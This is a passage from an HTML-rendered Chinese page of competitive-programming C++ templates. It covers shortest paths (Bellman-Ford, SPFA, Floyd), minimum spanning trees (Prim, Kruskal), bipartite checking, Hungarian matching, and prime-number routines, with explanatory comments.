n表示点数，m表示边数</span><br><span class="hljs-keyword">int</span> dist[N];        <span class="hljs-comment">// dist[x]存储1到x的最短路距离</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Edge</span>     // 边，<span class="hljs-title">a</span>表示出点，<span class="hljs-title">b</span>表示入点，<span class="hljs-title">w</span>表示边的权重</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> a, b, w;<br>&#125;edges[M];<br><br><span class="hljs-comment">// 求1到n的最短路距离，如果无法从1走到n，则返回-1。</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">bellman_ford</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(dist, <span class="hljs-number">0x3f</span>, <span class="hljs-keyword">sizeof</span> dist);<br>    dist[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 如果第n次迭代仍然会松弛三角不等式，就说明存在一条长度是n+1的最短路径，由抽屉原理，路径中至少存在两个相同的点，说明图中存在负权回路。</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; m; j ++ )<br>        &#123;<br>            <span class="hljs-keyword">int</span> a = edges[j].a, b = edges[j].b, w = edges[j].w;<br>            <span class="hljs-keyword">if</span> (dist[b] &gt; dist[a] + w)<br>                dist[b] = dist[a] + w;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (dist[n] &gt; <span class="hljs-number">0x3f3f3f3f</span> / <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-6-SPFA算法（队列优化的Bellman-Ford算法）"><a href="#3-6-SPFA算法（队列优化的Bellman-Ford算法）" class="headerlink" title="3.6 SPFA算法（队列优化的Bellman-Ford算法）"></a>3.6 SPFA算法（队列优化的Bellman-Ford算法）</h3><p>时间复杂度 平均情况下 O(m)，最坏情况下 O(nm), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;      <span class="hljs-comment">// 总点数</span><br><span class="hljs-keyword">int</span> h[N], w[N], e[N], ne[N], idx;       <span class="hljs-comment">// 邻接表存储所有边</span><br><span class="hljs-keyword">int</span> dist[N];        <span class="hljs-comment">// 存储每个点到1号点的最短距离</span><br><span class="hljs-keyword">bool</span> st[N];     <span class="hljs-comment">// 存储每个点是否在队列中</span><br><br><span class="hljs-comment">// 求1号点到n号点的最短路距离，如果从1号点无法走到n号点则返回-1</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">spfa</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(dist, <span class="hljs-number">0x3f</span>, <span class="hljs-keyword">sizeof</span> dist);<br>    dist[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">queue</span>&lt;<span class="hljs-keyword">int</span>&gt; q;<br>    q.push(<span class="hljs-number">1</span>);<br>    st[<span class="hljs-number">1</span>] = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">while</span> (q.size())<br>    &#123;<br>        <span class="hljs-keyword">auto</span> t = q.front();<br>        q.pop();<br><br>        st[t] = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = h[t]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>        &#123;<br>            <span class="hljs-keyword">int</span> j = e[i];<br>            <span class="hljs-keyword">if</span> (dist[j] &gt; dist[t] + w[i])<br>            &#123;<br>                dist[j] = dist[t] + w[i];<br>                <span class="hljs-keyword">if</span> (!st[j])     <span class="hljs-comment">// 如果队列中已存在j，则不需要将j重复插入</span><br>                &#123;<br>                    q.push(j);<br>                    st[j] = <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (dist[n] == <span class="hljs-number">0x3f3f3f3f</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> dist[n];<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-7-SPFA判断图中是否存在负环"><a href="#3-7-SPFA判断图中是否存在负环" class="headerlink" title="3.7 SPFA判断图中是否存在负环"></a>3.7 SPFA判断图中是否存在负环</h3><p>时间复杂度是 O(nm), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;      <span class="hljs-comment">// 总点数</span><br><span class="hljs-keyword">int</span> h[N], w[N], e[N], ne[N], idx;       <span class="hljs-comment">// 邻接表存储所有边</span><br><span class="hljs-keyword">int</span> dist[N], cnt[N];        <span class="hljs-comment">// dist[x]存储1号点到x的最短距离，cnt[x]存储1到x的最短路中经过的点数</span><br><span class="hljs-keyword">bool</span> st[N];     <span class="hljs-comment">// 存储每个点是否在队列中</span><br><br><span class="hljs-comment">// 如果存在负环，则返回true，否则返回false。</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">spfa</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 不需要初始化dist数组</span><br>    <span class="hljs-comment">// 原理：如果某条最短路径上有n个点（除了自己），那么加上自己之后一共有n+1个点，由抽屉原理一定有两个点相同，所以存在环。</span><br><br>    <span class="hljs-built_in">queue</span>&lt;<span class="hljs-keyword">int</span>&gt; q;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>    &#123;<br>        q.push(i);<br>        st[i] = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (q.size())<br>    &#123;<br>        <span class="hljs-keyword">auto</span> t = q.front();<br>        q.pop();<br><br>        st[t] = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = h[t]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>        &#123;<br>            <span class="hljs-keyword">int</span> j = e[i];<br>            <span class="hljs-keyword">if</span> (dist[j] &gt; dist[t] + w[i])<br>            &#123;<br>                dist[j] = dist[t] + w[i];<br>                cnt[j] = cnt[t] + <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">if</span> (cnt[j] &gt;= n) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;       <span class="hljs-comment">// 如果从1号点到x的最短路中包含至少n个点（不包括自己），则说明存在环</span><br>                <span class="hljs-keyword">if</span> (!st[j])<br>                &#123;<br>                    q.push(j);<br>                    st[j] = <span class="hljs-literal">true</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-8-Floyd算法"><a href="#3-8-Floyd算法" class="headerlink" title="3.8 Floyd算法"></a>3.8 Floyd算法</h3><p>时间复杂度是 O(n<sup>3</sup>), n 表示点数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">初始化：<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j ++ )<br>            <span class="hljs-keyword">if</span> (i == j) d[i][j] = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">else</span> d[i][j] = INF;<br><br><span class="hljs-comment">// 算法结束后，d[a][b]表示a到b的最短距离</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">floyd</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">1</span>; k &lt;= n; k ++ )<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j ++ )<br>                d[i][j] = min(d[i][j], d[i][k] + d[k][j]);<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-9-朴素Prim算法"><a href="#3-9-朴素Prim算法" class="headerlink" title="3.9 朴素Prim算法"></a>3.9 朴素Prim算法</h3><p>时间复杂度是 O(n<sup>2</sup>+m), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;      <span class="hljs-comment">// n表示点数</span><br><span class="hljs-keyword">int</span> g[N][N];        <span class="hljs-comment">// 邻接矩阵，存储所有边</span><br><span class="hljs-keyword">int</span> dist[N];        <span class="hljs-comment">// 存储其他点到当前最小生成树的距离</span><br><span class="hljs-keyword">bool</span> st[N];     <span class="hljs-comment">// 存储每个点是否已经在生成树中</span><br><br><br><span class="hljs-comment">// 如果图不连通，则返回INF(值是0x3f3f3f3f), 否则返回最小生成树的树边权重之和</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">prim</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(dist, <span class="hljs-number">0x3f</span>, <span class="hljs-keyword">sizeof</span> dist);<br><br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">int</span> t = <span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j ++ )<br>            <span class="hljs-keyword">if</span> (!st[j] &amp;&amp; (t == <span class="hljs-number">-1</span> || dist[t] &gt; dist[j]))<br>                t = j;<br><br>        <span class="hljs-keyword">if</span> (i &amp;&amp; dist[t] == INF) <span class="hljs-keyword">return</span> INF;<br><br>        <span class="hljs-keyword">if</span> (i) res += dist[t];<br>        st[t] = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>; j &lt;= n; j ++ ) dist[j] = min(dist[j], g[t][j]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-10-Kruskal算法"><a href="#3-10-Kruskal算法" class="headerlink" title="3.10 Kruskal算法"></a>3.10 Kruskal算法</h3><p>时间复杂度是 O(mlogm), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n, m;       <span class="hljs-comment">// n是点数，m是边数</span><br><span class="hljs-keyword">int</span> p[N];       <span class="hljs-comment">// 并查集的父节点数组</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Edge</span>     // 存储边</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> a, b, w;<br><br>    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span>&lt; (<span class="hljs-keyword">const</span> Edge &amp;W)<span class="hljs-keyword">const</span><br>    &#123;<br>        <span class="hljs-keyword">return</span> w &lt; W.w;<br>    &#125;<br>&#125;edges[M];<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span>     <span class="hljs-comment">// 并查集核心操作</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (p[x] != x) p[x] = find(p[x]);<br>    <span class="hljs-keyword">return</span> p[x];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">kruskal</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    sort(edges, edges + m);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ ) p[i] = i;    <span class="hljs-comment">// 初始化并查集</span><br><br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>, cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">int</span> a = edges[i].a, b = edges[i].b, w = edges[i].w;<br><br>        a = find(a), b = find(b);<br>        <span class="hljs-keyword">if</span> (a != b)     <span class="hljs-comment">// 如果两个连通块不连通，则将这两个连通块合并</span><br>        &#123;<br>            p[a] = b;<br>            res += w;<br>            cnt ++ ;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (cnt &lt; n - <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> INF;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-11-染色法判别二分图"><a href="#3-11-染色法判别二分图" class="headerlink" title="3.11 染色法判别二分图"></a>3.11 染色法判别二分图</h3><p>时间复杂度是 O(n+m), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n;      <span class="hljs-comment">// n表示点数</span><br><span class="hljs-keyword">int</span> h[N], e[M], ne[M], idx;     <span class="hljs-comment">// 邻接表存储图</span><br><span class="hljs-keyword">int</span> color[N];       <span class="hljs-comment">// 表示每个点的颜色，-1表示未染色，0表示白色，1表示黑色</span><br><br><span class="hljs-comment">// 参数：u表示当前节点，c表示当前点的颜色</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> u, <span class="hljs-keyword">int</span> c)</span></span><br><span class="hljs-function"></span>&#123;<br>    color[u] = c;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = h[u]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>    &#123;<br>        <span class="hljs-keyword">int</span> j = e[i];<br>        <span class="hljs-keyword">if</span> (color[j] == <span class="hljs-number">-1</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (!dfs(j, !c)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (color[j] == c) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">check</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">memset</span>(color, <span class="hljs-number">-1</span>, <span class="hljs-keyword">sizeof</span> color);<br>    <span class="hljs-keyword">bool</span> flag = <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i ++ )<br>        <span class="hljs-keyword">if</span> (color[i] == <span class="hljs-number">-1</span>)<br>            <span class="hljs-keyword">if</span> (!dfs(i, <span class="hljs-number">0</span>))<br>            &#123;<br>                flag = <span class="hljs-literal">false</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>    <span class="hljs-keyword">return</span> flag;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h3 id="3-12-匈牙利算法"><a href="#3-12-匈牙利算法" class="headerlink" title="3.12 匈牙利算法"></a>3.12 匈牙利算法</h3><p>时间复杂度是 O(nm), n 表示点数，m 表示边数。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> n1, n2;     <span class="hljs-comment">// n1表示第一个集合中的点数，n2表示第二个集合中的点数</span><br><span class="hljs-keyword">int</span> h[N], e[M], ne[M], idx;     <span class="hljs-comment">// 邻接表存储所有边，匈牙利算法中只会用到从第一个集合指向第二个集合的边，所以这里只用存一个方向的边</span><br><span class="hljs-keyword">int</span> match[N];       <span class="hljs-comment">// 存储第二个集合中的每个点当前匹配的第一个集合中的点是哪个</span><br><span class="hljs-keyword">bool</span> st[N];     <span class="hljs-comment">// 表示第二个集合中的每个点是否已经被遍历过</span><br><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = h[x]; i != <span class="hljs-number">-1</span>; i = ne[i])<br>    &#123;<br>        <span class="hljs-keyword">int</span> j = e[i];<br>        <span class="hljs-keyword">if</span> (!st[j])<br>        &#123;<br>            st[j] = <span class="hljs-literal">true</span>;<br>            <span class="hljs-keyword">if</span> (match[j] == <span class="hljs-number">0</span> || find(match[j]))<br>            &#123;<br>                match[j] = x;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-comment">// 求最大匹配数，依次枚举第一个集合中的每个点能否匹配第二个集合中的点</span><br><span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n1; i ++ )<br>&#123;<br>    <span class="hljs-built_in">memset</span>(st, <span class="hljs-literal">false</span>, <span class="hljs-keyword">sizeof</span> st);<br>    <span class="hljs-keyword">if</span> (find(i)) res ++ ;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><h2 id="四-数学知识"><a href="#四-数学知识" class="headerlink" title="四.数学知识"></a>四.数学知识</h2><h3 id="4-1-试除法判定质数"><a href="#4-1-试除法判定质数" class="headerlink" title="4.1 试除法判定质数"></a>4.1 试除法判定质数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">is_prime</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt;= x / i; i ++ )<br>        <span class="hljs-keyword">if</span> (x % i == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-2-试除法分解质因数"><a href="#4-2-试除法分解质因数" class="headerlink" title="4.2 试除法分解质因数"></a>4.2 试除法分解质因数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">divide</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt;= x / i; i ++ )<br>        <span class="hljs-keyword">if</span> (x % i == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">int</span> s = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">while</span> (x % i == <span class="hljs-number">0</span>) x /= i, s ++ ;<br>            <span class="hljs-built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&#x27; &#x27;</span> &lt;&lt; s &lt;&lt; <span class="hljs-built_in">endl</span>;<br>        &#125;<br>    <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">1</span>) <span class="hljs-built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="hljs-string">&#x27; &#x27;</span> &lt;&lt; <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-3-朴素筛法求素数"><a href="#4-3-朴素筛法求素数" class="headerlink" title="4.3 朴素筛法求素数"></a>4.3 朴素筛法求素数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> primes[N], cnt;     <span class="hljs-comment">// primes[]存储所有素数</span><br><span class="hljs-keyword">bool</span> st[N];         <span class="hljs-comment">// st[x]存储x是否被筛掉</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_primes</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>; i &lt;= n; i ++ )<br>    &#123;<br>        <span class="hljs-keyword">if</span> (st[i]) <span class="hljs-keyword">continue</span>;<br>        primes[cnt ++ ] = i;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i + i; j &lt;= n; j += i)<br>            st[j] = <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-4-线性筛法求素数"><a href="#4-4-线性筛法求素数" class="headerlink" title="4.4 线性筛法求素数"></a>4.4 线性筛法求素数</h3><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> primes[N], cnt;     <span class="hljs-comment">// primes[]存储所有素数</span><br><span class="hljs-keyword">bool</span> st[N];         <span class="hljs-comment">// 